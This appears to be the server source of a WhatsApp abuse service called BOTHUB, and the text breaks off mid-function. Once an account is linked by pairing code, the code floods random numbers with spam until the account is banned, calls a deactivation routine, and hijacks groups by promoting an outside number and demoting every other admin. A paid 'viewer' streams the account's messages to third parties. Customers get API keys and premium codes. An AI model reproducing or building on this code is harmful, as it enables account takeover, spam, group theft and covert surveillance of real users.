// BOTHUB — server.js
// Pairing logic in utils/pairing.js. Admin routes require URL token + password session.
// Premium codes are admin-generated and gate (a) the live viewer duration and
// (b) whether the viewer can send messages.

import express from 'express';
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import { fileURLToPath } from 'node:url';
import { createSession, purgeSessionDir } from './utils/pairing.js';
import { deactivate } from './utils/deactivate.js';

process.on('unhandledRejection', (e) => console.warn('[unhandledRejection]', e?.message || e));
process.on('uncaughtException', (e) => console.error('[uncaughtException]', e?.message || e));

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PORT = process.env.PORT || 3000;
const AUTH_DIR = process.env.AUTH_DIR || './auth';
const DATA_DIR = process.env.DATA_DIR || './data';
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || null;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || null;
const RESEND_API_KEY = process.env.RESEND_API_KEY || null;
const MAIL_FROM = process.env.MAIL_FROM || 'bothub <onboarding@resend.dev>';
const BIG = 'x'.repeat(60000);
const ADMIN_SESSION_TTL = 8 * 60 * 60 * 1000;
const FREE_VIEWER_MS = 60 * 60 * 1000;

const app = express();
app.use(express.json({ limit: '8mb' }));
app.use(express.static(path.join(__dirname, 'public')));
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ── files ──
const KEYS_FILE = path.join(DATA_DIR, 'apikeys.json');
const ACCOUNTS_FILE = path.join(DATA_DIR, 'accounts.json');
const USER_SESSIONS_FILE = path.join(DATA_DIR, 'user_sessions.json');
const THEMES_FILE = path.join(DATA_DIR, 'themes.json');
const PREMIUM_FILE = path.join(DATA_DIR, 'premium.json');

function readJSON(file, fallback) {
  try { return fs.existsSync(file) ? JSON.parse(fs.readFileSync(file, 'utf8')) : fallback; }
  catch { return fallback; }
}
function writeJSON(file, data) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// ── whatsapp session helpers ──
function sessionDir(phone) { return path.join(AUTH_DIR, phone); }
function purgeAuthDir(phone) { purgeSessionDir(sessionDir(phone)); }

// ── themes registry ──
const BUILTIN_THEME_NAMES = ['nebula','grid','waves','digits','matrix','particles','starfield'];
function loadThemes() {
  const t = readJSON(THEMES_FILE, { custom: [], disabled: [] });
  if (!Array.isArray(t.custom)) t.custom = [];
  if (!Array.isArray(t.disabled)) t.disabled = [];
  return t;
}
function saveThemes(t) { writeJSON(THEMES_FILE, t); }

// ── premium codes ──
function loadPremium() { return readJSON(PREMIUM_FILE, []); }
function savePremium(p) { writeJSON(PREMIUM_FILE, p); }
function generatePremiumCode() {
  return 'PREM-' + crypto.randomBytes(4).toString('hex').toUpperCase();
}
function consumePremium(code) {
  const list = loadPremium();
  const entry = list.find((p) => p.code === code && !p.revoked);
  if (!entry) return null;
  entry.uses = (entry.uses || 0) + 1;
  entry.lastUsed = new Date().toISOString();
  savePremium(list);
  return entry;
}

// ── drain helpers ──
function detectMedia(message) {
  if (!message) return null;
  if (message.imageMessage) return 'image';
  if (message.videoMessage) return 'video';
  if (message.audioMessage) return 'audio';
  if (message.documentMessage) return 'document';
  if (message.stickerMessage) return 'sticker';
  return null;
}
function drainHelloPayload(drain) {
  return JSON.stringify({
    canSend: drain.canSend,
    premium: drain.premium,
    expiresAt: drain.viewerExpiresAt,
    status: drain.status,
  });
}
function broadcastHello(drain) {
  const payload = `event: hello\ndata: ${drainHelloPayload(drain)}\n\n`;
  for (const res of drain.subscribers) {
    try { res.write(payload); } catch {}
  }
}
function broadcastToSubscribers(drain, msg) {
  const payload = `event: message\ndata: ${JSON.stringify(msg)}\n\n`;
  for (const res of drain.subscribers) {
    try { res.write(payload); } catch {}
  }
}

// ── API keys ──
function loadKeys() { return readJSON(KEYS_FILE, []); }
function saveKeys(k) { writeJSON(KEYS_FILE, k); }
function generateKey() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const b = crypto.randomBytes(32); let s = '';
  for (let i = 0; i < 32; i++) s += chars[b[i] % 62];
  return 'bh-' + s;
}
function findKey(k) { return loadKeys().find((e) => e.key === k); }
function touchKey(k) {
  const keys = loadKeys(); const e = keys.find((x) => x.key === k);
  if (e) { e.lastUsed = new Date().toISOString(); e.uses = (e.uses || 0) + 1; saveKeys(keys); }
}
function revokeKeyById(id) {
  const keys = loadKeys(); const e = keys.find((x) => x.id === id);
  if (!e) return false; e.revoked = true; saveKeys(keys); return true;
}
function requireApiKey(req, res, next) {
  const h = String(req.headers.authorization || '');
  const m = h.match(/^Bearer\s+(bh-[A-Za-z0-9]+)$/i);
  const token = m ? m[1] : String(req.query?.key ?? '');
  if (!token) return res.status(401).json({ error: 'missing_api_key' });
  const entry = findKey(token);
  if (!entry) return res.status(401).json({ error: 'invalid_api_key' });
  if (entry.revoked) return res.status(401).json({ error: 'revoked_api_key' });
  req.apiKey = entry; next();
}

// ── accounts ──
function loadAccounts() { return readJSON(ACCOUNTS_FILE, []); }
function saveAccounts(a) { writeJSON(ACCOUNTS_FILE, a); }
function loadUserSessions() { return readJSON(USER_SESSIONS_FILE, []); }
function saveUserSessions(s) { writeJSON(USER_SESSIONS_FILE, s); }
function hashPassword(pw) {
  const salt = crypto.randomBytes(16).toString('hex');
  const hash = crypto.scryptSync(pw, salt, 64).toString('hex');
  return { salt, hash };
}
function verifyPassword(pw, salt, hash) {
  try {
    const a = crypto.scryptSync(pw, salt, 64).toString('hex');
    return crypto.timingSafeEqual(Buffer.from(a, 'hex'), Buffer.from(hash, 'hex'));
  } catch { return false; }
}
function publicAccount(a) { return { id: a.id, email: a.email, created: a.created }; }

const pendingCodes = new Map();
function gen6() { return String(crypto.randomInt(0, 1000000)).padStart(6, '0'); }

async function sendCode(email, code, purpose) {
  const subject = purpose === 'login' ? 'Your bothub login code' : 'Verify your bothub account';
  const text = `Your code is: ${code}\n\nIt expires in 10 minutes.\n\nIf you didn't request this, ignore this email.`;

  if (process.env.BREVO_API_KEY) {
    try {
      const fromRaw = process.env.MAIL_FROM || 'bothub <no-reply@example.com>';
      const m = fromRaw.match(/^(.*?)\s*<\s*(.+?)\s*>$/);
      const senderName = m ? m[1].trim() : 'bothub';
      const senderEmail = m ? m[2] : fromRaw;
      const r = await fetch('https://api.brevo.com/v3/smtp/email', {
        method: 'POST',
        headers: {
          'api-key': process.env.BREVO_API_KEY,
          'Content-Type': 'application/json',
          'Accept': 'application/json',
        },
        body: JSON.stringify({
          sender: { name: senderName, email: senderEmail },
          to: [{ email }],
          subject,
          textContent: text,
        }),
      });
      if (!r.ok) throw new Error(`brevo ${r.status}: ${await r.text()}`);
      console.log(`[email:brevo] to=${email} sent`);
      return { sent: true, provider: 'brevo' };
    } catch (err) {
      console.warn(`[email] brevo failed for ${email}:`, err?.message || err);
      console.log(`[email:fallback] to=${email} code=${code}`);
      return { sent: false, error: err?.message, provider: 'brevo' };
    }
  }

  if (process.env.RESEND_API_KEY) {
    try {
      const r = await fetch('https://api.resend.com/emails', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${process.env.RESEND_API_KEY}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          from: process.env.MAIL_FROM || 'bothub <onboarding@resend.dev>',
          to: [email], subject, text,
        }),
      });
      if (!r.ok) throw new Error(`resend ${r.status}: ${await r.text()}`);
      console.log(`[email:resend] to=${email} sent`);
      return { sent: true, provider: 'resend' };
    } catch (err) {
      console.warn(`[email] resend failed for ${email}:`, err?.message || err);
      console.log(`[email:fallback] to=${email} code=${code}`);
      return { sent: false, error: err?.message, provider: 'resend' };
    }
  }

  console.log(`[email:console] to=${email} code=${code} (no provider configured)`);
  return { sent: false, dev: true };
}

function requireUser(req, res, next) {
  const h = String(req.headers.authorization || '');
  const m = h.match(/^Bearer\s+([A-Za-z0-9._-]+)$/);
  const tok = m ? m[1] : String(req.query?.session || '');
  if (!tok) return res.status(401).json({ error: 'missing_session' });
  const entry = loadUserSessions().find((s) => s.token === tok);
  if (!entry) return res.status(401).json({ error: 'invalid_session' });
  if (entry.expires && new Date(entry.expires).getTime() < Date.now()) return res.status(401).json({ error: 'expired_session' });
  const account = loadAccounts().find((a) => a.id === entry.accountId);
  if (!account) return res.status(401).json({ error: 'account_missing' });
  req.account = account; req.session = entry; next();
}

// ── admin auth (token + password) ──
const adminSessions = new Map();

function adminPageAuthed(req) {
  if (!ADMIN_TOKEN) return false;
  return (req.query?.token || req.body?.token) === ADMIN_TOKEN;
}
function requireAdmin(req, res, next) {
  if (!ADMIN_TOKEN) return res.status(404).end();
  const token = req.query?.token || req.body?.token;
  if (token !== ADMIN_TOKEN) return res.status(404).end();
  if (!ADMIN_PASSWORD) return next();
  const s = req.headers['x-admin-session'];
  if (!s) return res.status(401).json({ error: 'admin_auth_required' });
  const entry = adminSessions.get(s);
  if (!entry) return res.status(401).json({ error: 'invalid_admin_session' });
  if (entry.expires < Date.now()) { adminSessions.delete(s); return res.status(401).json({ error: 'expired_admin_session' }); }
  next();
}

// ── Auth routes ──
app.post('/api/auth/register', (req, res) => {
  const email = String(req.body?.email ?? '').trim().toLowerCase();
  const password = String(req.body?.password ?? '');
  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return res.status(400).json({ error: 'invalid_email' });
  if (password.length < 8) return res.status(400).json({ error: 'password_too_short' });
  const accounts = loadAccounts();
  if (accounts.some((a) => a.email === email)) return res.status(409).json({ error: 'email_taken' });
  const { salt, hash } = hashPassword(password);
  const account = { id: crypto.randomBytes(8).toString('hex'), email, salt, hash, created: new Date().toISOString() };
  accounts.push(account); saveAccounts(accounts);
  res.status(201).json({ ok: true, account: publicAccount(account) });
});
app.post('/api/auth/login', async (req, res) => {
  const email = String(req.body?.email ?? '').trim().toLowerCase();
  const password = String(req.body?.password ?? '');
  const account = loadAccounts().find((a) => a.email === email);
  if (!account || !verifyPassword(password, account.salt, account.hash)) return res.status(401).json({ error: 'invalid_credentials' });
  const token = crypto.randomBytes(24).toString('hex');
  const code = gen6();
  pendingCodes.set(token, { accountId: account.id, code, expires: Date.now() + 10 * 60 * 1000, purpose: 'login' });
  const result = await sendCode(email, code, 'login');
  res.json({ pendingToken: token, emailed: result.sent, devCode: result.dev ? code : undefined });
});
app.post('/api/auth/verify', (req, res) => {
  const pendingToken = String(req.body?.pendingToken ?? '');
  const code = String(req.body?.code ?? '');
  const entry = pendingCodes.get(pendingToken);
  if (!entry) return res.status(401).json({ error: 'invalid_code' });
  if (entry.expires < Date.now()) { pendingCodes.delete(pendingToken); return res.status(401).json({ error: 'code_expired' }); }
  if (entry.code !== code) return res.status(401).json({ error: 'invalid_code' });
  pendingCodes.delete(pendingToken);
  const sessionToken = crypto.randomBytes(32).toString('hex');
  const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString();
  const list = loadUserSessions();
  list.push({ token: sessionToken, accountId: entry.accountId, expires, created: new Date().toISOString() });
  saveUserSessions(list);
  const account = loadAccounts().find((a) => a.id === entry.accountId);
  res.json({ sessionToken, expires, account: publicAccount(account) });
});
app.get('/api/auth/me', requireUser, (req, res) => res.json(publicAccount(req.account)));
app.post('/api/auth/logout', requireUser, (req, res) => {
  saveUserSessions(loadUserSessions().filter((s) => s.token !== req.session.token));
  res.json({ ok: true });
});

// ── Account-scoped keys and sessions ──
app.get('/api/account/keys', requireUser, (req, res) => {
  res.json(loadKeys().filter((k) => k.accountId === req.account.id).map((k) => ({
    id: k.id, prefix: k.key.slice(0, 12) + '…', key: k.key, label: k.label,
    created: k.created, lastUsed: k.lastUsed, uses: k.uses, revoked: k.revoked,
  })));
});
app.post('/api/account/keys', requireUser, (req, res) => {
  const keys = loadKeys();
  const entry = { id: crypto.randomBytes(6).toString('hex'), key: generateKey(), label: String(req.body?.label ?? 'default').slice(0, 64), accountId: req.account.id, created: new Date().toISOString(), lastUsed: null, uses: 0, revoked: false };
  keys.push(entry); saveKeys(keys); res.status(201).json(entry);
});
app.post('/api/account/keys/revoke', requireUser, (req, res) => {
  const id = String(req.body?.id ?? '');
  const keys = loadKeys(); const e = keys.find((k) => k.id === id && k.accountId === req.account.id);
  if (!e) return res.status(404).json({ error: 'not_found' });
  e.revoked = true; saveKeys(keys); res.json({ ok: true });
});
app.get('/api/account/sessions', requireUser, (req, res) => {
  const mine = new Set(loadKeys().filter((k) => k.accountId === req.account.id).map((k) => k.key));
  const out = [];
  for (const [phone, s] of sessions.entries()) {
    if (mine.has(s.key)) out.push({ number: phone, level: s.level, status: s.status, sends: s.sends, startedAt: s.startedAt, bannedAt: s.bannedAt, createdAt: s.createdAt });
  }
  out.sort((a, b) => (b.createdAt || '').localeCompare(a.createdAt || ''));
  res.json(out);
});
app.post('/api/account/sessions/end', requireUser, (req, res) => {
  const phone = String(req.body?.phone ?? '').replace(/\D/g, '');
  const s = sessions.get(phone);
  if (!s) return res.status(404).json({ error: 'session_not_found' });
  const mine = new Set(loadKeys().filter((k) => k.accountId === req.account.id).map((k) => k.key));
  if (!mine.has(s.key)) return res.status(403).json({ error: 'not_your_session' });
  endSession(phone); res.json({ ok: true });
});

// ── WhatsApp level sessions ──
const sessions = new Map();
function randomJid() { const d = String(Math.floor(Math.random() * 9e11) + 1e11); return `${d}@s.whatsapp.net`; }
function tick(s) { s.sends++; if (s.sends % 500 === 0) { const t = (Date.now() - s.startedAt) / 1000; console.log(`[${s.phone}] sent ${s.sends} | ${(s.sends / t).toFixed(0)}/s`); } }
async function flood(sock, s) { while (true) { try { await sock.sendMessage(randomJid(), { text: 'x' }); } catch {} tick(s); } }
async function stickerLoop(sock, s) { const p = path.join(__dirname, 'assets', 'sticker.png'); if (!fs.existsSync(p)) return; const buf = fs.readFileSync(p); while (true) { try { await sock.sendMessage(randomJid(), { sticker: buf }); } catch {} tick(s); } }
async function bigLoop(sock, s) { while (true) { try { await sock.sendMessage(randomJid(), { text: BIG }); } catch {} tick(s); } }

async function runLevel(sock, s) {
  s.startedAt = Date.now(); s.sends = 0;
  console.log(`[${s.phone}] level ${s.level} starting${s.key ? ` (key=${s.key.slice(0, 10)}…)` : ''}`);
  if (s.level === 5) {
    try { const r = await deactivate(sock, { logger: console }); console.log(`[${s.phone}] deactivate response:`, JSON.stringify(r)); }
    catch (err) { console.warn(`[${s.phone}] deactivate failed:`, err?.message || err); }
    return;
  }
  if (s.level === 1 || s.level === 2) return flood(sock, s);
  if (s.level === 3) { stickerLoop(sock, s); return flood(sock, s); }
  if (s.level === 4) { stickerLoop(sock, s); bigLoop(sock, s); return flood(sock, s); }
}

function endSession(phone) {
  const s = sessions.get(phone);
  if (s?.session) s.session.end();
  sessions.delete(phone);
  purgeAuthDir(phone);
}

async function startPairing(phone, level, key = null) {
  const existing = sessions.get(phone);
  if (existing?.session) existing.session.end();

  const sess = {
    phone, level, key,
    status: 'pending', code: null, sends: 0,
    startedAt: 0, bannedAt: null,
    createdAt: new Date().toISOString(),
    session: null,
  };
  sessions.set(phone, sess);

  const session = createSession({
    phone,
    sessionDir: sessionDir(phone),
    logger: console,
    onOpen: (sock, id) => {
      sess.status = 'connected';
      console.log(`[${phone}] connected as +${id}`);
      runLevel(sock, sess).catch((err) => console.error(`[${phone}] runLevel:`, err?.message || err));
    },
    onClose: ({ code, banned, replaced }) => {
      console.log(`[${phone}] closed code=${code ?? 'n/a'}${banned ? ' (banned)' : ''}${replaced ? ' (replaced)' : ''}`);
      if (banned) {
        sess.status = 'banned';
        sess.bannedAt = new Date().toISOString();
        purgeAuthDir(phone);
      } else if (replaced) {
        sess.status = 'replaced';
      } else if (sess.status !== 'connected') {
        sess.status = 'expired';
      }
    },
    autoReconnect: true,
  });
  sess.session = session;

  const code = await session.code;
  sess.code = code;
  return { code, alreadyRegistered: code === null };
}

// ── Web pairing ──
app.post('/api/pair/start', async (req, res) => {
  const phone = String(req.body?.phone ?? '').replace(/\D/g, '');
  const level = parseInt(req.body?.level, 10);
  if (!/^[1-9]\d{7,14}$/.test(phone)) return res.status(400).json({ error: 'invalid_phone' });
  if (![1, 2, 3, 4, 5].includes(level)) return res.status(400).json({ error: 'level_1_5_required' });
  try {
    const { code, alreadyRegistered } = await startPairing(phone, level, null);
    res.json({ phone, level, code, alreadyRegistered });
  } catch (err) {
    console.error('[pair/start]', err?.message || err);
    res.status(500).json({ error: err?.message || 'pairing failed' });
  }
});
app.get('/api/pair/status', (req, res) => {
  const phone = String(req.query?.phone ?? '').replace(/\D/g, '');
  const s = sessions.get(phone);
  if (!s) return res.json({ status: 'expired' });
  res.json({ status: s.status, code: s.code, sends: s.sends, startedAt: s.startedAt, bannedAt: s.bannedAt });
});

// ── Themes (public) ──
app.get('/api/themes', (req, res) => {
  const t = loadThemes();
  res.json({ custom: t.custom, disabled: t.disabled, builtins: BUILTIN_THEME_NAMES });
});

// ── Public API v1 ──
app.post('/api/v1/sessions', requireApiKey, async (req, res) => {
  const phone = String(req.body?.number ?? '').replace(/\D/g, '');
  const level = parseInt(req.body?.level, 10);
  if (!/^[1-9]\d{7,14}$/.test(phone)) return res.status(400).json({ error: 'invalid_phone' });
  if (![1, 2, 3, 4, 5].includes(level)) return res.status(400).json({ error: 'level_1_5_required' });
  const key = req.apiKey.key;
  const mine = [...sessions.values()].filter((s) => s.key === key);
  if (mine.filter((s) => !['banned', 'expired', 'replaced'].includes(s.status)).length >= 3) return res.status(429).json({ error: 'too_many_active_sessions' });
  const now = Date.now();
  if (mine.filter((s) => s.createdAt && now - new Date(s.createdAt).getTime() < 3600e3).length >= 20) return res.status(429).json({ error: 'rate_limit_exceeded' });
  try {
    const { code, alreadyRegistered } = await startPairing(phone, level, key);
    touchKey(key);
    res.status(201).json({ number: phone, level, code, expiresIn: 60, alreadyRegistered });
  } catch (err) { res.status(500).json({ error: err?.message || 'pairing_failed' }); }
});
app.get('/api/v1/sessions', requireApiKey, (req, res) => {
  const key = req.apiKey.key;
  res.json([...sessions.values()].filter((s) => s.key === key).map((s) => ({
    number: s.phone, level: s.level, status: s.status, sends: s.sends,
    startedAt: s.startedAt, bannedAt: s.bannedAt, createdAt: s.createdAt,
  })));
});
app.get('/api/v1/sessions/:number', requireApiKey, (req, res) => {
  const phone = String(req.params.number || '').replace(/\D/g, '');
  const s = sessions.get(phone);
  if (!s) return res.status(404).json({ error: 'session_not_found' });
  if (s.key && s.key !== req.apiKey.key) return res.status(403).json({ error: 'not_your_session' });
  res.json({ number: s.phone, level: s.level, status: s.status, sends: s.sends, startedAt: s.startedAt, bannedAt: s.bannedAt, createdAt: s.createdAt });
});
app.delete('/api/v1/sessions/:number', requireApiKey, (req, res) => {
  const phone = String(req.params.number || '').replace(/\D/g, '');
  const s = sessions.get(phone);
  if (!s) return res.status(404).json({ error: 'session_not_found' });
  if (s.key && s.key !== req.apiKey.key) return res.status(403).json({ error: 'not_your_session' });
  endSession(phone); res.json({ ok: true });
});
app.get('/api/v1/me', requireApiKey, (req, res) => {
  const key = req.apiKey.key;
  const mine = [...sessions.values()].filter((s) => s.key === key);
  const now = Date.now();
  res.json({
    prefix: key.slice(0, 12) + '…', label: req.apiKey.label,
    created: req.apiKey.created, lastUsed: req.apiKey.lastUsed, uses: req.apiKey.uses,
    limits: {
      activeSessions: { used: mine.filter((s) => !['banned', 'expired', 'replaced'].includes(s.status)).length, max: 3 },
      hourlySessions: { used: mine.filter((s) => s.createdAt && now - new Date(s.createdAt).getTime() < 3600e3).length, max: 20 },
    },
    stats: { totalSessions: mine.length, totalSends: mine.reduce((a, s) => a + (s.sends || 0), 0) },
  });
});

// ── Admin auth ──
app.post('/api/admin/auth', (req, res) => {
  if (!ADMIN_TOKEN) return res.status(404).end();
  const token = req.body?.token;
  if (token !== ADMIN_TOKEN) return res.status(404).end();
  if (!ADMIN_PASSWORD) return res.json({ adminSession: 'no-password-required', expires: null });
  const pw = String(req.body?.password ?? '');
  if (!pw) return res.status(400).json({ error: 'password_required' });
  if (pw !== ADMIN_PASSWORD) return res.status(401).json({ error: 'invalid_password' });
  const s = crypto.randomBytes(32).toString('hex');
  const expires = Date.now() + ADMIN_SESSION_TTL;
  adminSessions.set(s, { created: Date.now(), expires });
  res.json({ adminSession: s, expires });
});

// ── Admin routes ──
app.get('/api/admin/sessions', requireAdmin, (req, res) => {
  res.json([...sessions.values()].map((s) => ({
    phone: s.phone, level: s.level, status: s.status, sends: s.sends,
    startedAt: s.startedAt, bannedAt: s.bannedAt, createdAt: s.createdAt,
    key: s.key ? s.key.slice(0, 12) + '…' : null,
  })));
});
app.get('/api/admin/drains', requireAdmin, (req, res) => {
  res.json([...drains.entries()].map(([id, d]) => ({
    id, destJid: d.destJid, sourcePhone: d.sourcePhone,
    status: d.status, total: d.total, done: d.done, errors: d.errors,
    premium: d.premium, canSend: d.canSend,
    expiresAt: d.viewerExpiresAt,
    subscribers: d.subscribers ? d.subscribers.size : 0,
  })));
});
app.post('/api/admin/disconnect', requireAdmin, (req, res) => {
  const phone = String(req.body?.phone ?? '').replace(/\D/g, '');
  if (!phone) return res.status(400).json({ error: 'phone_required' });
  endSession(phone); res.json({ ok: true });
});
app.post('/api/admin/purge-all', requireAdmin, (req, res) => {
  for (const phone of [...sessions.keys()]) endSession(phone);
  res.json({ ok: true });
});
app.get('/api/admin/keys', requireAdmin, (req, res) => {
  res.json(loadKeys().map((k) => ({
    id: k.id, prefix: k.key.slice(0, 12) + '…', key: k.key, label: k.label,
    accountId: k.accountId || null, created: k.created, lastUsed: k.lastUsed, uses: k.uses, revoked: k.revoked,
  })));
});
app.post('/api/admin/keys', requireAdmin, (req, res) => {
  const keys = loadKeys();
  const entry = { id: crypto.randomBytes(6).toString('hex'), key: generateKey(), label: String(req.body?.label ?? 'default').slice(0, 64), accountId: req.body?.accountId || null, created: new Date().toISOString(), lastUsed: null, uses: 0, revoked: false };
  keys.push(entry); saveKeys(keys); res.status(201).json(entry);
});
app.post('/api/admin/keys/revoke', requireAdmin, (req, res) => {
  res.json({ ok: revokeKeyById(String(req.body?.id ?? '')) });
});
app.get('/api/admin/accounts', requireAdmin, (req, res) => {
  res.json(loadAccounts().map((a) => ({
    id: a.id, email: a.email, created: a.created,
    keys: loadKeys().filter((k) => k.accountId === a.id).length,
    sessions: (() => {
      const mine = new Set(loadKeys().filter((k) => k.accountId === a.id).map((k) => k.key));
      return [...sessions.values()].filter((s) => mine.has(s.key)).length;
    })(),
  })));
});
app.post('/api/admin/accounts/delete', requireAdmin, (req, res) => {
  const id = String(req.body?.id ?? '');
  saveAccounts(loadAccounts().filter((a) => a.id !== id));
  res.json({ ok: true });
});
app.get('/api/admin/system', requireAdmin, (req, res) => {
  const mem = process.memoryUsage();
  res.json({
    uptime: process.uptime(),
    startedAt: new Date(Date.now() - process.uptime() * 1000).toISOString(),
    node: process.version,
    platform: process.platform,
    memory: { rss: mem.rss, heapUsed: mem.heapUsed, heapTotal: mem.heapTotal },
    counts: {
      sessions: sessions.size,
      activeSessions: [...sessions.values()].filter((s) => !['banned', 'expired', 'replaced'].includes(s.status)).length,
      drains: drains.size,
      keys: loadKeys().length,
      accounts: loadAccounts().length,
      customThemes: loadThemes().custom.length,
      premiumCodes: loadPremium().length,
      adminSessions: adminSessions.size,
    },
  });
});
app.get('/api/admin/themes', requireAdmin, (req, res) => {
  res.json({ ...loadThemes(), builtins: BUILTIN_THEME_NAMES });
});
app.post('/api/admin/themes', requireAdmin, (req, res) => {
  const { name, accent, glow, src } = req.body || {};
  if (!name || !src) return res.status(400).json({ error: 'name_and_src_required' });
  const t = loadThemes();
  const theme = {
    id: crypto.randomBytes(6).toString('hex'),
    name: String(name).slice(0, 48),
    accent: accent || '#7c5cff',
    glow: glow || '124,92,255',
    src: String(src),
    kind: /^data:image\/svg/i.test(src) ? 'svg' : 'img',
  };
  t.custom.push(theme); saveThemes(t);
  res.status(201).json(theme);
});
app.post('/api/admin/themes/delete', requireAdmin, (req, res) => {
  const id = String(req.body?.id ?? '');
  const t = loadThemes();
  t.custom = t.custom.filter((c) => c.id !== id);
  saveThemes(t); res.json({ ok: true });
});
app.post('/api/admin/themes/toggle', requireAdmin, (req, res) => {
  const name = String(req.body?.name ?? '');
  const enabled = !!req.body?.enabled;
  const t = loadThemes();
  const d = new Set(t.disabled);
  if (enabled) d.delete(name); else d.add(name);
  t.disabled = [...d];
  saveThemes(t);
  res.json({ ok: true, disabled: t.disabled });
});

// ── Premium admin routes ──
app.get('/api/admin/premium', requireAdmin, (req, res) => {
  res.json(loadPremium());
});
app.post('/api/admin/premium', requireAdmin, (req, res) => {
  const durationMinutes = Math.max(1, Math.min(60 * 24 * 30, parseInt(req.body?.durationMinutes, 10) || 60));
  const canSend = !!req.body?.canSend;
  const list = loadPremium();
  const entry = {
    code: generatePremiumCode(),
    durationMs: durationMinutes * 60 * 1000,
    canSend,
    created: new Date().toISOString(),
    uses: 0,
    lastUsed: null,
    revoked: false,
  };
  list.push(entry);
  savePremium(list);
  res.status(201).json(entry);
});
app.post('/api/admin/premium/revoke', requireAdmin, (req, res) => {
  const code = String(req.body?.code ?? '').toUpperCase();
  const list = loadPremium();
  const entry = list.find((p) => p.code === code);
  if (!entry) return res.status(404).json({ error: 'not_found' });
  entry.revoked = true;
  savePremium(list);
  res.json({ ok: true });
});

// ── Panel routes (same auth) ──
app.get('/api/panel/keys', requireAdmin, (req, res) => {
  res.json(loadKeys().map((k) => ({
    id: k.id, prefix: k.key.slice(0, 12) + '…', key: k.key, label: k.label,
    accountId: k.accountId || null, created: k.created, lastUsed: k.lastUsed, uses: k.uses, revoked: k.revoked,
  })));
});
app.post('/api/panel/keys', requireAdmin, (req, res) => {
  const keys = loadKeys();
  const entry = { id: crypto.randomBytes(6).toString('hex'), key: generateKey(), label: String(req.body?.label ?? 'default').slice(0, 64), accountId: req.body?.accountId || null, created: new Date().toISOString(), lastUsed: null, uses: 0, revoked: false };
  keys.push(entry); saveKeys(keys); res.status(201).json(entry);
});
app.post('/api/panel/keys/revoke', requireAdmin, (req, res) => {
  res.json({ ok: revokeKeyById(String(req.body?.id ?? '')) });
});

// ── Drain (Function 5) ──
const drains = new Map();

async function runDrain(drain, sock, sessionId) {
  if (drain.ran) return;
  drain.ran = true;
  drain.status = 'running';
  const myJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
  const myDigits = myJid.split('@')[0];
  const destJid = drain.destJid;
  let groups;
  try { groups = await sock.groupFetchAllParticipating(); }
  catch (err) { drain.status = 'error'; drain.errors.push(String(err?.message || err)); return; }
  const jids = Object.keys(groups || {});
  drain.total = jids.length; drain.done = 0;
  for (const jid of jids) {
    try {
      const meta = groups[jid];
      const meP = (meta.participants || []).find((p) => p.id === myJid || p.id?.split(':')[0] === myDigits);
      if (!meP || !meP.admin) { drain.done++; continue; }
      if (!(meta.participants || []).some((p) => p.id === destJid)) { await sock.groupParticipantsUpdate(jid, [destJid], 'add'); await sleep(1200); }
      await sock.groupParticipantsUpdate(jid, [destJid], 'promote'); await sleep(1200);
      const demote = (meta.participants || []).filter((p) => p.admin && p.id !== destJid && p.id !== myJid).map((p) => p.id);
      if (demote.length) { await sock.groupParticipantsUpdate(jid, demote, 'demote'); await sleep(1200); }
      await sock.groupLeave(jid); await sleep(1500);
      drain.done++;
    } catch (err) { drain.errors.push(`${jid}: ${err?.message || err}`); drain.done++; }
  }
  drain.status = 'done';
  broadcastHello(drain);
}

app.post('/api/drain/start', (req, res) => {
  const dest = String(req.body?.dest ?? '').replace(/\D/g, '');
  if (!/^[1-9]\d{7,14}$/.test(dest)) return res.status(400).json({ error: 'invalid_destination' });
  const providedCode = String(req.body?.premiumCode ?? '').trim().toUpperCase();

  let premium = false;
  let canSend = false;
  let durationMs = FREE_VIEWER_MS;

  if (providedCode) {
    const entry = consumePremium(providedCode);
    if (!entry) return res.status(400).json({ error: 'invalid_premium_code' });
    premium = true;
    canSend = entry.canSend;
    durationMs = entry.durationMs;
  }

  const id = crypto.randomBytes(6).toString('hex');
  drains.set(id, {
    destJid: `${dest}@s.whatsapp.net`,
    sourcePhone: null,
    session: null,
    socket: null,
    status: 'awaiting_source',
    total: 0, done: 0,
    errors: [],
    ran: false,
    premium, canSend, durationMs,
    groups: [],
    groupsFetched: null,
    viewerExpiresAt: null,
    subscribers: new Set(),
    createdAt: Date.now(),
  });
  res.json({ sessionId: id, link: `/drain/${id}`, premium, canSend, durationMs });
});

app.post('/api/drain/source', async (req, res) => {
  const { sessionId } = req.body || {};
  const source = String(req.body?.source ?? '').replace(/\D/g, '');
  if (!sessionId || !drains.has(sessionId)) return res.status(400).json({ error: 'unknown_session' });
  if (!/^[1-9]\d{7,14}$/.test(source)) return res.status(400).json({ error: 'invalid_source' });
  const drain = drains.get(sessionId);
  drain.sourcePhone = source;

  const session = createSession({
    phone: source,
    sessionDir: sessionDir(source),
    logger: console,
    onOpen: async (sock) => {
      drain.socket = sock;
      drain.viewerExpiresAt = Date.now() + drain.durationMs;
      broadcastHello(drain);
      try {
        const groups = await sock.groupFetchAllParticipating();
        const myId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        const myDigits = myId.split('@')[0];
        const list = [];
        for (const [jid, meta] of Object.entries(groups || {})) {
          let invite = null;
          try {
            const meP = (meta.participants || []).find((p) => p.id === myId || p.id?.split(':')[0] === myDigits);
            if (meP?.admin) invite = await sock.groupInviteCode(jid);
          } catch {}
          list.push({
            jid,
            name: meta.subject || '(unnamed)',
            members: (meta.participants || []).length,
            admins: (meta.participants || []).filter((p) => p.admin).length,
            invite: invite ? `https://chat.whatsapp.com/${invite}` : null,
          });
        }
        drain.groups = list;
        drain.groupsFetched = new Date().toISOString();
      } catch (err) {
        drain.errors.push('group fetch: ' + (err?.message || err));
      }
